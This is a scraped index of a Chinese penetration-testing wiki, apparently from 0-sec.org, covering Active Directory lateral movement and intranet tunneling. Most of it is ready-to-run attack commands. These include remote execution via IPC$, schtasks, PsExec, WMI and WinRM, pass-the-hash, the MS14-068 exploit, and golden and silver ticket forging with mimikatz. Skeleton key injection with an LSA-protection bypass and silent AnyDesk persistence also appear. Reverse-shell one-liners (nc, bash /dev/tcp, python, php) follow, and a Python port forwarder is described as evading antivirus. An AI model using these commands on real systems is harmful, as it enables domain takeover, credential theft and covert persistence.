文件、创建计划任务","keywords":"","body":"4.2.1.2 建立 IPC 连接、copy 文件、创建计划任务 net use \\\\192.168.19.169\\c$ test@123 /user:adtest\\jeff1 copy 1.bat \\\\192.168.19.169\\c$ net time \\\\192.168.19.169 at \\\\192.168.19.169 1:03 c:\\1.bat schtasks 由于 at 在新版本的系统中已被弃用，我们需要用 schtasks 替代 schtasks /create /s 192.168.19.177 /u adtest\\jeff1 /p test@123 /ru \"SYSTEM\" /tn test /sc DAILY /tr c:\\1.bat /F 创建计划任务，/s 指定远程机器名或 ip 地址，/ru 指定运行任务的用户权限，这里指定 为最高的 SYSTEM，/tn 是任务名称，/sc 是任务运行频率，这里指定为每天运行，并没什么 实际意义，/tr 指定运行的文件，/F 表示如果指定的任务已经存在，则强制创建任务并抑制警告 运行任务，其中/i 表示立即运行 schtasks /run /s 192.168.19.177 /u adtest\\jeff1 /p test@123 /tn test /i 删除计划任务 schtasks /delete /s 192.168.19.177 /u adtest\\jeff1 /p test@123 /tn test /f 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-05 13:56:55 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/4.2.1.3.html":{"url":"域渗透/4.2.1.3.html","title":"4.2.1.3 IPC 常见错误","keywords":"","body":"4.2.1.3 IPC 常见错误 错误号 5，拒绝访问 : 很可能你使用的用户不是管理员权限的，先提升权限; 错误号 51，Windows 无法找到网络路径 : 网络有问题; 错误号 53，找不到网络路径 : ip 地址错误;目标未开机;目标 lanmanserver 服务未启动; 目标有防火墙(端口过滤); 错误号 67，找不到网络名 : 你的 lanmanworkstation 服务未启动;目标删除了 ipc$; 错 误号 1219，提供的凭据与已存在的凭据集冲突:你已经和对方建立了一个 ipc$，请删除再 连。 错误号 1326，未知的用户名或错误密码:原因很明显了; 错误号 1792，试图登录，但是网络登录服务没有启动:目标 NetLogon 服务未启动。(连接 域控会出现此情况) 错误号 2242，此用户的密码已经过期:目标有帐号策略，强制定期要求更改密码。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 18:09:27 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/4.2.1.4.html":{"url":"域渗透/4.2.1.4.html","title":"4.2.1.4 PsTools","keywords":"","body":"4.2.1.4 PsTools PsTools 是 sysinternals 开发的一个功能强大的安全管理工具包，最新版目前共有 13 个 各种功能的小工具。这里介绍下 psexec，psexec 是一款远程执行命令的工具，在内网渗透 的时候常它来进行横向移动。 下载地址:https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec PsExec 1、 若已建立 IPC$连接，无需再次输入账号密码，所有 pstools 工具可直接使用 net use //查看 ipc 连接状态 2、 若未建立 IPC 连接，则要使用账号密码进行登录 PsExec.exe \\\\192.168.19.178 -u adtest\\jeff1 -p test@123 cmd.exe 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 18:09:46 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/4.2.2.1.html":{"url":"域渗透/4.2.2.1.html","title":"4.2.2.1 WMI 利用条件","keywords":"","body":"4.2.2.1 WMI 利用条件 1、WMI 服务开启(默认开启) 2、135 端口未被过滤 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 18:10:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/4.2.2.2.html":{"url":"域渗透/4.2.2.2.html","title":"4.2.2.2 利用 wmic 进行横向移动","keywords":"","body":"4.2.2.2 利用 wmic 进行横向移动 利用系统自带的工具 wmic 在目标主机上执行任意命令 wmic /node:192.168.19.178 /user:adtest\\jeff1 /password:test@123 process call create \"calc\" 缺点:无法回显命令 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 18:11:52 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/4.2.2.3.html":{"url":"域渗透/4.2.2.3.html","title":"4.2.2.3 wmiexec.vbs","keywords":"","body":"4.2.2.3 wmiexec.vbs wmiexec.vbs 是为了解决 wmic 无法回显命令而开发的一个工具，原理就是把数据先存 到一个临时文件中，在每次读取完执行结果后就自动删除。可以用来回显执行命令的结果和 获取半交互式的 shell cscript wmiexec.vbs /cmd 192.168.19.178 adtest\\jeff1 test@123 whoami cscript wmiexec.vbs /shell 192.168.19.178 adtest\\jeff1 test@123 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 18:13:20 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/4.2.3.1.html":{"url":"域渗透/4.2.3.1.html","title":"4.2.3.1 WinRM 利用条件","keywords":"","body":"4.2.3.1 WinRM 利用条件 1、适用于 win7 及以后的系统，win7 和 server 08 默认关闭 2、server 12 之后的版本才默认允许远程任意主机进行管理 3、防火墙未过滤 5985、5986 端口 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 18:16:39 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/4.2.3.2.html":{"url":"域渗透/4.2.3.2.html","title":"4.2.3.2 WINRS","keywords":"","body":"4.2.3.2 WINRS winrs(windows remote shell)是 WinRM 的客户端,需要管理员权限才能运行，可直接执行 命令，也可以返回交互式 shell winrs -r:192.168.19.100 -u:adtest\\administrator -p:admin@124 \"cmd” winrs -r:192.168.19.100 -u:adtest\\administrator -p:admin@124 whoami 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 18:19:51 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/4.2.3.3.html":{"url":"域渗透/4.2.3.3.html","title":"4.2.3.3 Powershell Invoke-Command","keywords":"","body":"4.2.3.3 Powershell Invoke-Command PS C:\\Users\\jeff1> Invoke-Command -ComputerName 192.168.19.100 -ScriptBlock {whoami} -credential adtest\\administrator 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 18:21:09 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/4.2.4.1.html":{"url":"域渗透/4.2.4.1.html","title":"4.2.4.1 Mimikatz","keywords":"","body":"4.2.4.1 Mimikatz mimikatz # sekurlsa::pth /user:administrator /domain:. /ntlm:c5113714efbff7fa196f2e2b50938a8f 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 18:27:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/4.2.4.2.html":{"url":"域渗透/4.2.4.2.html","title":"4.2.4.2 impacket-examples-windows","keywords":"","body":"4.2.4.2 impacket-examples-windows impacket-examples-windows 是 impacket(网络协议工具包)的 windows 版本，包含 了几十款工具，这里使用 wmiexec.exe 来演示 pth 攻击。 wmiexec.exe -hashes b084e803561e306bff17365faf1ffe89:db23832fd3822fcaea5c019f090fe752 ADTEST/jeff1@192.168.19.14 \"whoami\" 下载地址: impacket-examples-windows: https://github.com/maaaaz/impacket-examples-windows/releases impacket: https://github.com/SecureAuthCorp/impacket 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 18:28:58 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/4.2.5.html":{"url":"域渗透/4.2.5.html","title":"4.2.5 MS14-068","keywords":"","body":"4.2.5 MS14-068 MS14-068 是一个能够使普通用户提权获取域控权限的权限提升漏洞，微软给出的补丁 是 kb3011780。在 server 2000 以上的域控中，只要没打这个补丁，都有可能被利用。 1、 尝试直接访问域控的 C 盘 2、使用 ms14-068 的 exp，生成票据 C:\\Users\\jeff1\\Desktop>MS14-068.exe -u jeff1@adtest.com -s S-1-5-21-3418659180-3 421952656-1938706522-1109 -d 192.168.19.100 -p test@124 3、 使用 mimilatz 导入生成的 ccache 文件，导入之前 cmd 下使用命令 klist purge 或者在 mimikatz 中使用 kerberos::purge 删除当前缓存的 kerberos 票据 导入票据: kerberos::ptc TGT_jeff1@adtest.com.ccache 4、 再次访问域控 MS14-068 下载地址: https://github.com/ianxtianxt/MS14-068 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 18:37:25 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/5.1.1.html":{"url":"域渗透/5.1.1.html","title":"5.1.1 制作黄金票据的前提条件","keywords":"","body":"5.1.1 制作黄金票据的前提条件 1、域名称 2、域的 SID 3、域的 KRBTGT 账户的密码 hash 值 4、伪造的用户名，可以是任意用户甚至是不存在的用户 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 20:09:51 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/5.1.2.html":{"url":"域渗透/5.1.2.html","title":"5.1.2 黄金票据利用","keywords":"","body":"5.1.2 黄金票据利用 1、导出 krbtgt 密码 hash mimikatz#lsadump::dcsync /domain:adtest.com /user:krbtgt 导出所有域内用户密码 hash 值: mimikatz#lsadump::dcsync /domain:adtest.com /all /csv 2、获取域 SID 在导出 krbtgt 的 hash 的时候已经包含了域 SID，也可以用以下命令来查看域 SID whoami /all 3、伪造黄金票据 mimikatz.exe privilege::debug \"kerberos::golden /domain:adtest.com /sid:S-1-5-21- 3418659180-3421952656-1938706522 /target:WIN-9P499QKTLDO.ADTEST.COM /service:cifs /rc4: 6f0fdf50f2dcee2fed8e2e3eae7e1592 /user:aaa /ptt\" 这里可以不指定 target 和 service kerberos::golden /domain:adtest.com /sid:S-1-5-21-3418659180-3421952656- 1938706522 /rc4:6f0fdf50f2dcee2fed8e2e3eae7e1592 /user:aaa /ptt 使用 klist 查看本地缓存的票据 获得票据后可直接通过 dir 远程访问主机，可以直接使用 ipc 进行连接: 当然也可以使用 psexec 去获得一个 cmdshell: 注:普通黄金票据不能跨域使用;TGT 有效时间为 20 分钟;。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 20:14:33 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/5.2.1.html":{"url":"域渗透/5.2.1.html","title":"5.2.1 伪造白银票据的前提条件件","keywords":"","body":"5.2.1 伪造白银票据的前提条件 1、域名称 2、域的 SID 3、域的服务账号的密码 hash 4、伪造的用户名(可以是任意的) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 20:15:53 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/5.2.2.html":{"url":"域渗透/5.2.2.html","title":"5.2.2 白银票据的利用","keywords":"","body":"5.2.2 白银票据的利用 在黄金票据中我们可以不指定 target 和 service，但是在白银票据中必须指定 target 和 service mimikatz.exe privilege::debug \"kerberos::golden /domain:adtest.com /sid:S-1-5-21- 3418659180-3421952656-1938706522 /target:WIN-9P499QKTLDO.ADTEST.COM /service:cifs /rc4:22eec3fbe7191bdcf1e5819f8bdcd951 /user:aaa /ptt\" 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 20:17:27 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"域渗透/5.3.html":{"url":"域渗透/5.3.html","title":"5.3 skeleton key","keywords":"","body":"5.3 skeleton key skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效。 1、 在域控上安装 skeleton key mimikatz.exe privilege::debug \"misc::skeleton\" 2、 在域内其他机器尝试使用 skeleton key 去访问域控 添加的密码是 mimikatz C:\\Users\\jeff1>net use \\\\WIN-9P499QKTLDO.adtest.com\\c$ mimikatz /user:adtest\\adm inistrator 3、 微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注 入。如果直接尝试添加 skelenton key 会失败。 适用系统: windows 8.1 windows server 2012 及以上 当然 mimikatz 依旧可以绕过，命令如下: privilege::debug !+ !processprotect /process:lsass.exe /remove misc::skeleton 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-24 20:21:25 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网穿透/ABPTTS/1.html":{"url":"内网渗透/内网穿透/ABPTTS/1.html","title":"ABPTTS","keywords":"","body":"介绍 Abptts是一款基于python2.7的http加密隧道工具，Abptts能做的很多： 通过http加密隧道转发至目标内网下指定的单个TCP端口 通过http加密隧道同时转发至目标内网下的多台机器上的多个tcp端口 把ssh隧道包裹在http加密隧道中传递，对目标二级内网进行穿透 缺点：不支持PHP 使用流程 git clone https://github.com/nccgroup/ABPTTS.git pip install pycrypto pip install httplib2 cd ABPTTS python abpttsfactory.py ‐o webshell 在webshell目录里有aspx、jsp等脚本 将对应格式的脚本上传至测试机 python abpttsclient.py -c webshell\\config.txt -u \"http://www.0-sec.org/abptts.aspx\" -f 127.0.0.1:1112/127.0.0.1:3389 mstsc 127.0.0.1:1112 设置本地代理 访问内网 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-22 15:50:29 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网穿透/Anydesk/1.html":{"url":"内网渗透/内网穿透/Anydesk/1.html","title":"Anydesk","keywords":"","body":"Anydesk Anydesk是一款类似于Teamviewer的远控软件，可以采用免安装打开,除了覆盖配置以外,还提供了很便捷的API。 在文件目录下执行以下代码便可以安装并设置远程连接密码(高权) AnyDesk.exe --install \"C:\\Install\\AnyDesk\\Here\" --start-with-win --silent --create-shortcuts --create-desktop-icon echo licence_keyABC | \"C:\\Install\\AnyDesk\\Here\\AnyDesk.exe\" --register-licence echo password123 | \"C:\\Install\\AnyDesk\\Here\\AnyDesk.exe\" --set-password 同时也可以通过如下命令获取正在运行种的Anydesk连接用户名： @echo off for /f \"delims=\" %%i in ('anydesk --get-id') do set CID=%%i echo AnyDesk password is: %CID% pause 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-06 17:23:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网穿透/ew/1.html":{"url":"内网渗透/内网穿透/ew/1.html","title":"ew","keywords":"","body":"EW正向代理 Web服务器的设置 如果是Linux系统 ./ew_for_linux64 -s ssocksd -l 1080 #监听本地的1080端口 如果是Windows系统 ew_for_Win.exe -s ssocksd -l 1080 #监听本地的1080端口 主机的设置 如果是Linux系统，配置proxychains代理链的配置文件，将代理设置成 100.100.10.12的1080端口：socks5 100.100.10.12 1080 然后命令前面加上 proxychains即可。如：proxychains curl 192.168.10.19 如果是Windows系统，直接浏览器中设置代理为 100.100.10.12的1080端口，或者利用 Proxifier 、sockscap64 设置全局代理 EW反向代理 Web服务器的设置 如果是Linux系统： ./ew_for_linux64 -s rssocks -d 100.100.10.13 -e 8888 #将本机的流量全部转发到100.100.10.13的8888端口 如果是Windows系统： ew_for_Win.exe -s rssocks -d 100.100.10.13 -e 8888 #将本机的流量全部转发到100.100.10.13的8888端口 主机的设置 如果是Linux系统： ./ew_for_linux64 -s rcsocks -l 1080 -e 8888 #将本机的8888端口的流量都转发给1080端口，这里8888端口只是用于传输流量 然后配置proxychains代理链的配置文件，将代理设置成 127.0.0.1的1080端口：socks5 127.0.0.1 1080 然后命令前面加上 proxychains即可。如：proxychains curl 192.168.10.19 如果是Windows系统 ew_for_Win.exe -s rcsocks -l 1080 -e 8888 #将本机的8888端口的流量都转发给1080端口，这里8888端口只是用于传输流量 然后浏览器中设置代理为 100.100.10.12的1080端口，或者利用 Proxifier 、sockscap64 设置全局代理 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-16 17:48:04 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网穿透/frp/1.html":{"url":"内网渗透/内网穿透/frp/1.html","title":"frp","keywords":"","body":"frp内网穿透 测试环境： 阿里云公网主机：ip:47.xx.xx.xx 内网主机 windows 域名 （有没有都可以） 测试流程 先分别在公网和内网主机上下载frp的对应版本 地址为https://github.com/fatedier/frp/releases linux直接wget或者直接下载好拖进去即可 1. 在linux文件目录里修改frps.ini配置文件 第一个端口为链接服务器的端口 第二个端口为访问web的端口 2. 修改windows文件目录里的frpc.ini文件 对应端口对着填就行了 3. 完事之后访问公网ip+web端口 如图 排坑指南 1.我是阿里云的服务器，在阿里云控制台 开放了端口之后 依然不通 后来想到我装的有宝塔，然后吧宝塔的防火墙策略也添加了规则就行了 2.custom_domains =这一项 也可以填域名，但是如果填域名的话，测试的时候 比如说你填的带www 访问的时候就得带www 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-07 00:46:30 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网穿透/lcx/1.html":{"url":"内网渗透/内网穿透/lcx/1.html","title":"lcx","keywords":"","body":"实现LCX功能的参考方法 一.LCX简介 lcx是一款强大的内网端口转发工具，用于将内网主机开放的内部端口映射到外网主机（有公网IP）任意端口。它是一款命令行工具，当然也可以在有权限的webshell下执行，正因如此lcx常被认为是一款黑客入侵工具，lcx在内网入侵渗透中起着重要的角色。lcx进行端口转发的原理就是使不同端口之间形成一个回路。它常用于外网连接内网3389等端口。 二.LCX实现思路 基于命令的LCX 在windows和linux 中都存在对于端口的转发命令，人们习惯于称呼为映射，英文为DNAT(Destination Network Address Translation)，官方名称为目的地址转换，这种方式在防火墙和路由器中比较常见。 windows 目的地址转换命令简介 Windows下使用netsh命令,来进行目的地址转换。netsh(Network Shell) 是一个windows系统本身**的功能强大的网络配置命令行工具。它允许从本地或远程显示或修改当前正在运行的计算机的网络配置。Netsh 命令的强大，目的地址映射只是其中小部分功能。如此强大的命令如何使用呢？ 命令|含义 ---|--- netsh interface portproxy add v4tov4 listenaddress=192.168.1.8 listenport=14941 connectaddress=192.168.1.118 connectport=1494|在IPV4下将监听本地IP 192.168.1.8:14941,接受到的数据转发给192.168.1.118:1494。 netsh interface portproxy delete v4tov4 listenaddress=192.168.1.8 listenport=33891|在IPV4下删除监听本地IP 192.168.1.8:33891 netsh interface portproxy show v4tov4|查看在IPV4下配置的端口转发的策略 linux 目的地址转换命令简介 Linux下使用iptables命令，来进行目的地址转换。在默认情况下，linux会禁用此类功能，需要手动开启。iptables是Linux 内核集成的 IP 信息包过滤系统，也就是人们常说的LINUX自带防火墙，经常被用于配置ACL(Access Control List)访问控制列表。iptables在不同的LINUX版本中存在不同的名称。2.0.X内核：ipfwadm，2.2.X内核：ipchains，2.4.X内核：iptables。目前linux版本基本为2.4.x以上，低版本的linux比较少见，下面讲解的命令，在2.4.x以上的内核版本linux中有效。 开启目的地址转发功能 临时修改法: echo 1 >/proc/sys/net/ipv4/ip_forward 永久修改法: vi /etc/sysctl.conf，net.ipv4.ip_forward = 1找到并修改值为1，sysctl –p（使之立即生效） 假设用户访问172.16.4.247:728时我想让它转发到172.16.4.97:80： # iptables -t nat -A PREROUTING -p tcp -d 113.108.110.61 --dport 728 -j DNAT --to-destination 172.16.4.97:80 # iptables -t nat -A POSTROUTING -p tcp -s 172.16.4.97 --sport 80 -j SNAT --to-source 172.16.4.247 # service iptables save（将当前规则保存到 /etc/sysconfig/iptables） 本机间不同的端口转发： iptables -t nat -A PREROUTING -p tcp --dport 729 -j REDIRECT --to-ports 80 service iptables save service iptables restart 自实现LCX 基于命令的LCX存在无法绕过杀毒软件的拦截，并且需要管理员权限等问题。所以大多数LCX是使用自实现目的地址转换的方式编写的工具。简单说下目的地址转换的原理。 目的地址转换的基本工作原理是当公网主机同一IP包发送至存在目的地址转换策略的主机端口时，将IP包中的目的地址以及端口进行替换，并且代发送给替换后的地址和端口。 采用PYTHON编写LCX工具，工具的使用效果感觉上是非常不错的，但是ptyhon程序打包成exe的体积相对比较庞大。笔者推荐使用asyncore 模块，Python的asyncore模块**了以异步的方式写入套接字服务的客户端和服务器的基础结构，使用比较方便。这个模块是一个以时间驱动的异步I/O，与C++的事件选择模型相似。每当发生写、读事件会交由我们重写的事件函数进行处理。下面开始编写自实现的LCX。 1、第一步需要先定义Forwarder： class PortForwarder(asyncore.dispatcher):#监听本地 def __init__(self, ip, port, remoteip, remoteport, backlog=5): asyncore.dispatcher.__init__(self) self.remoteip = remoteip self.remoteport = remoteport self.create_socket(socket.AF_INET, socket.SOCK_STREAM)#创建一个套接字对象 self.set_reuse_addr()#设置地址端口可重用 self.bind((ip, port))#绑定本地ip与端口 self.listen(backlog)#开始监听 def handle_accept(self):#处理接受 conn, addr = self.accept()#等待接受 print \"Connected to:\", addr Sender(Receiver(conn), self.remoteip, self.remoteport) 2、第二步调用Forwarder,并且执行asyncore.loop（用于循环监听网络事件）: PortForwarder(local_host, local_port, remote_host, remote_port) asyncore.loop() 3、需要接*本地的请求，发给远程主机: class Receiver(asyncore.dispatcher):#接受本地请求数据，发送给远程主机 def __init__(self, conn): asyncore.dispatcher.__init__(self, conn) #self被初始化为该连接客户端socket #getpeername函数用于获取与某个套接字关联的外地协议地址 self.from_remote_buffer = ''#保存来自远程主机数据 self.to_remote_buffer = '' #保存本地请求数据 self.sender = None def handle_connect(self): pass def handle_read(self):#接受本地请求 read = self.recv(BUFSIZE) self.to_remote_buffer += read; print \"receiver read\", self.to_remote_buffer def writable(self):#判断是否有来自远程主机的数据，如果有，调用handle_write return (len(self.from_remote_buffer) > 0) def handle_write(self):#发送来自远程主机的数据给本地主机 sent = self.send(self.from_remote_buffer) print \"receiver sent\", sent self.from_remote_buffer = self.from_remote_buffer[sent:]#发送完成后清空数据 def handle_close(self): self.close() if self.sender: self.sender.close() 4、需要接受远程主机数据，发给本地请求： class Sender(asyncore.dispatcher):#接受远程主机数据，发送本地请求数据 def __init__(self, receiver, remoteaddr, remoteport): asyncore.dispatcher.__init__(self) self.receiver = receiver#建立Sender与Receiver之间联系 receiver.sender = self #建立Sender与Receiver之间联系 self.create_socket(socket.AF_INET, socket.SOCK_STREAM)#创建套接字 self.connect((remoteaddr, remoteport))#连接远程主机 def handle_connect(self): pass def handle_read(self):#接受来自远程主机的数据 read = self.recv(BUFSIZE) self.receiver.from_remote_buffer += read print \"sender read\", self.receiver.from_remote_buffer def writable(self):#判断是否有本地请求要发送，如果有，调用handle_write if len(self.receiver.to_remote_buffer) > 0: self.receiver.to_remote_buffer = self.receiver.to_remote_buffer.replace\\ (LOCAL_SERVER_HOST + ':' + str(LOCAL_SERVER_PORT), REMOTE_SERVER_HOST) #修改本地请求数据，将本地主机中host改为远程主机地址 return (len(self.receiver.to_remote_buffer) > 0) def handle_write(self):#发送本地请求数据 sent = self.send(self.receiver.to_remote_buffer) print \"sender write\",sent self.receiver.to_remote_buffer = self.receiver.to_remote_buffer[sent:] def handle_close(self): self.close() self.receiver.close() 到此一个简单的LCX程序就完成了，如果添加一些命令行交互提示功能，对于使用者将更加友好 三.总结 对于LCX原理以及实现思路，简单整理这么多。目前来说LCX这类程序，已经被杀毒软件列为木马。python编写程序的优势在于能够绕过杀毒软件的查杀。对于目的地址转发这项工作来说所需的代码比较少量，但是由于PYTHON打包成EXE时会内置编译器，所以EXE程序会相对比较大。如果将部分代码进行优化，能够比较好的缩减代码量。不过虽然代码量可能会有所减少，但是打包后的体积依旧比较大。对于这点目前并尚未找到妥善的解决方法。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-16 17:47:37 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网穿透/nc/1.html":{"url":"内网渗透/内网穿透/nc/1.html","title":"nc","keywords":"","body":"nc反弹常用命令 用 nc 反弹，命令如下： nc 1024 -e /bin/sh 某些目标的 nc 不支持 -e 参数，有两个解决思路，要么使用其他版本的 nc： nc.traditional 1024 -e /bin/sh 要么配合命名管道进行反弹： rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 1024 >/tmp/f 用 bash 反弹： /bin/bash -i >& /dev/tcp//1024 0>&1 用 python 反弹： python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\",1024));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 用 PHP 反弹： php -r '$sock=fsockopen(\"\",1024);exec(\"/bin/sh -i &3 2>&3\");' 用 exec 反弹： 0/dev/tcp//1024; sh &196 2>&196 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-16 17:45:20 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网穿透/reDuh/1.html":{"url":"内网渗透/内网穿透/reDuh/1.html","title":"reDuh","keywords":"","body":"reDuh 实现内网转发 Github地址 https://github.com/sensepost/reDuh 思维导图 reDuh使用条件 （1）获取目标服务器webshell，且可以上传reDuh服务端对应脚本文件。 （2）知道目标服务器开放的内网端口，如远程桌面的端口是3389。 （3）目标服务器网络做了端口策略限制，只允许外部访问内网的80等特定端口。 reDuh使用命令 （1）本地具备java环境，可以使用pentestbox自带java环境 java -jar reDuhClient.jar http://somesite.com/reDuh.aspx http or https port （2）本地连接1010端口 nc -vv localhost 1010 （3）在java命令窗口执行 [createTunnel]1234:127.0.0.1:3389 （4）使用mstsc登录127.0.0.1:1234 参考链接 https://blog.51cto.com/simeon/2112416 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-10 15:46:58 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网穿透/reGeorg/1.html":{"url":"内网渗透/内网穿透/reGeorg/1.html","title":"reGeorg","keywords":"","body":"reGeorg reGeory适用于公网服务器只开放了80端口的情况。 reGeorg是用 python 写的利用Web进行代理的工具，流量只通过 http 传输，也就是http隧道。 reGeorg 下载https://github.com/sensepost/reGeorg 上传对应语言版本的tunnel文件到服务器上。然后本地访问上传的源文件，即可在本地与远程主机上形成一个http的回路。命令如下： python reGeorgSocksProxy.py -p 6666 -u http://目标站点/xxx.php //端口随便指定，只要不与本机开放端口冲突即可 Proxychains代理及配置方法 配置proxychains代理链的配置文件 vim /etc/proxychains.conf ，将代理设置成本机的1080端口： socks5 127.0.0.1 6666 然后命令前面加上 proxychains即可。如： proxychains curl 内网ip Proxifier代理及配置方法 以上proxychains工具大多数情况下在mac/linux上使用，Windows下可以使用proxifier 创建代理服务器 设置代理规则 选中刚设置好的代理服务器就行了 所以我们流量的走向是： 流量->本地1080端口->web服务器的80端口(通过我们上传的php文件进行流量转发)->内网服务器->web服务器的80端口->本地1080端口 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-10 00:17:35 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网穿透/ssocks/1.html":{"url":"内网渗透/内网穿透/ssocks/1.html","title":"ssocks","keywords":"","body":"利用ssocks进行内网穿透 sSocks是一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试，而proxychains代理链是Linux下一款代理设置工具。由于Ssocks不稳定，所以不建议使用。 现在有这么一个环境，我们获取到了位于公网Web服务器的shell，该web服务器是Linux系统，内网中存在另外一台主机，这里假设内网存在一台Web服务器。然后，我们现在要将公网Web服务器设置为代理，访问和探测内网Web服务器的信息。 首先，我们的主机和公网的Web服务器都得安装上Ssocks。 proxychains的话 linux(基于debian)下直接apt install proxychains 就可以了 Web服务器的操作 ./rssocks -vv -s 100.100.10.13:9999 #接收100.100.10.13的9999端口的流量 主机的操作 首先配置proxychains代理链的配置文件，把最后的内容改成 socks5 127.0.0.1 8080 ./rcsocks -l 1080 -p 9999 -vv #然后将本地的1080端口的流量转发到9999端口 接下来，我们想要访问和操作操作内网主机192.168.10.19的话，只需要在命令前面加上 proxychains 比如，获得内网Web服务器的网页文件： proxychains curl 192.168.10.19 